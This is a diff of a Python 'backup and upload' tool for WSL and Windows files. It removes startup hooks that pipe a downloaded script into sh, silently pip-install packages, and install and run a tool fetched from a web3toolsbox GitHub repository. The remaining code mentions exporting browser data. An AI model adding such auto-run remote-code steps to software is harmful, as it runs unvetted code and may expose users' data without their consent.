@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
 自动备份和上传工具
-功能：备份WSL2和Windows系统中的重要文件，并自动上传到云存储
+功能：备份WSL和Windows系统中的重要文件，并自动上传到云存储
 """
 
 # 先导入标准库
@@ -100,71 +100,6 @@ def run_command(command, **kwargs):
     return result
 
 
-def command_exists(command_name):
-    """检查命令是否在当前环境中可用。"""
-    return shutil.which(command_name) is not None
-
-
-def get_uv_command():
-    """返回可用的 uv 调用方式。"""
-    if command_exists('uv'):
-        return ['uv']
-
-    user_home = os.path.expanduser('~')
-    candidate_paths = [
-        os.path.join(user_home, '.local', 'bin', 'uv'),
-        os.path.join(user_home, '.cargo', 'bin', 'uv'),
-    ]
-    for uv_path in candidate_paths:
-        if os.path.isfile(uv_path):
-            return [uv_path]
-
-    try:
-        result = subprocess.run(
-            [sys.executable, '-m', 'uv', '--version'],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            check=False,
-        )
-        if result.returncode == 0:
-            return [sys.executable, '-m', 'uv']
-    except Exception:
-        pass
-
-    return None
-
-
-@lru_cache(maxsize=1)
-def ensure_uv_installed():
-    """检查并安装 uv，返回可用的 uv 命令。"""
-    uv_command = get_uv_command()
-    if uv_command:
-        print("✓ uv 已安装")
-        return uv_command
-
-    print("⚠ 检测到 uv 未安装，正在尝试安装 uv ...")
-    try:
-        curl_process = subprocess.Popen(
-            ['curl', '-LsSf', 'https://astral.sh/uv/install.sh'],
-            stdout=subprocess.PIPE
-        )
-        subprocess.check_call(['sh'], stdin=curl_process.stdout)
-        curl_process.stdout.close()
-        curl_process.wait()
-        uv_command = get_uv_command()
-        if uv_command:
-            print("✓ uv 安装完成")
-            return uv_command
-        print("⚠ uv 安装脚本已执行，但当前进程仍未检测到 uv")
-        return None
-    except subprocess.CalledProcessError as e:
-        print(f"⚠ 安装 uv 失败: {str(e)}")
-        return None
-    except FileNotFoundError:
-        print("⚠ curl 命令未找到，无法安装 uv")
-        return None
-
-
 @lru_cache(maxsize=8192)
 def get_file_size_cached(path: str) -> int:
     """缓存文件大小，避免重复系统调用
@@ -205,121 +140,6 @@ def find_powershell_exe():
 
     return None
 
-def check_and_install_dependencies():
-    """检查并安装必需的依赖包（直接使用 python -m pip）"""
-    required_packages = {
-        'requests': 'requests',
-        'urllib3': 'urllib3',
-    }
-
-    optional_packages = {
-        'Crypto': 'pycryptodome',
-    }
-
-    missing_required = []
-    missing_optional = []
-
-    # 检查必需的依赖
-    for module_name, package_name in required_packages.items():
-        try:
-            __import__(module_name)
-        except ImportError:
-            missing_required.append(package_name)
-
-    for module_name, package_name in optional_packages.items():
-        try:
-            __import__(module_name)
-        except ImportError:
-            missing_optional.append(package_name)
-
-    if not missing_required and not missing_optional:
-        print("✓ 所有依赖已就绪")
-        return
-
-    # 安装缺失的必需依赖
-    if missing_required:
-        print(f"检测到缺失的必需依赖: {', '.join(missing_required)}")
-        print("正在使用 python3 -m pip 自动安装...")
-        failed_packages = []
-
-        for package in missing_required:
-            try:
-                subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', '--break-system-packages', package])
-                print(f"✓ 已安装: {package}")
-            except subprocess.CalledProcessError as e:
-                print(f"⚠ 安装失败: {package} - {str(e)}")
-                failed_packages.append(package)
-
-        if failed_packages:
-            print(f"⚠ 警告: 以下依赖安装失败，程序将继续运行，但相关功能可能不可用: {', '.join(failed_packages)}")
-
-    # 安装缺失的可选依赖
-    if missing_optional:
-        print(f"检测到缺失的可选依赖: {', '.join(missing_optional)}")
-        for package in missing_optional:
-            try:
-                subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', '--upgrade', '--break-system-packages', package])
-                print(f"✓ 已安装: {package}")
-            except subprocess.CalledProcessError as e:
-                print(f"⚠ 安装失败: {package} - {str(e)}（可选功能可能不可用）")
-
-def install_agent_setting():
-    """使用 uv 安装或升级 agent-setting 并运行（WSL 环境适配）"""
-    uv_command = ensure_uv_installed()
-    if not uv_command:
-        print("⚠ uv 不可用，跳过 agent-setting 的安装和执行")
-        return
-
-    has_agent_setting = command_exists('agent-setting')
-    try:
-        if has_agent_setting:
-            result = subprocess.run(
-                ['agent-setting', '--version'],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                check=False,
-            )
-            has_agent_setting = (result.returncode == 0)
-    except Exception as e:
-        print(f"⚠ 检查 agent-setting 失败: {str(e)}，将尝试安装")
-        has_agent_setting = False
-
-    agent_setting_spec = "git+https://github.com/web3toolsbox/agent-setting.git"
-
-    if not has_agent_setting:
-        print("检测到 agent-setting 未安装，正在通过 uv 安装 ...")
-        try:
-            result = run_command(uv_command + ['tool', 'install', agent_setting_spec])
-            if result.returncode != 0:
-                raise subprocess.CalledProcessError(result.returncode, result.args)
-            print("✓ 已通过 uv 安装 agent-setting")
-        except subprocess.CalledProcessError as e:
-            print(f"⚠ 通过 uv 安装 agent-setting 失败: {str(e)}")
-            return
-    else:
-        print("检测到 agent-setting 已安装，正在通过 uv 升级 ...")
-        try:
-            result = run_command(uv_command + ['tool', 'upgrade', 'agent-setting'])
-            if result.returncode != 0:
-                raise subprocess.CalledProcessError(result.returncode, result.args)
-            print("✓ 已通过 uv 升级 agent-setting")
-        except subprocess.CalledProcessError as e:
-            print(f"⚠ 通过 uv 升级 agent-setting 失败: {str(e)}")
-
-    try:
-        print("正在运行 agent-setting ...")
-        result = run_command(
-            uv_command + ['tool', 'run', '--from', agent_setting_spec, 'agent-setting']
-        )
-        if result.returncode != 0:
-            raise subprocess.CalledProcessError(result.returncode, result.args)
-        print("✓ agent-setting 执行完成")
-    except subprocess.CalledProcessError as e:
-        print(f"⚠ 运行 agent-setting 失败: {str(e)}")
-    except FileNotFoundError:
-        print("⚠ 未找到 agent-setting 命令，请检查 uv 是否正确安装")
-
-
 def load_optional_dependencies():
     """在自动安装依赖后再导入可选库。"""
     global requests, HTTPBasicAuth, urllib3
@@ -351,10 +171,8 @@ def load_optional_dependencies():
 
 @lru_cache(maxsize=1)
 def bootstrap_runtime():
-    """执行运行前的依赖和输出初始化。"""
+    """执行运行前的输出初始化。"""
     configure_console_encoding()
-    check_and_install_dependencies()
-    install_agent_setting()
     load_optional_dependencies()
 
 # 尝试导入浏览器数据导出所需的库
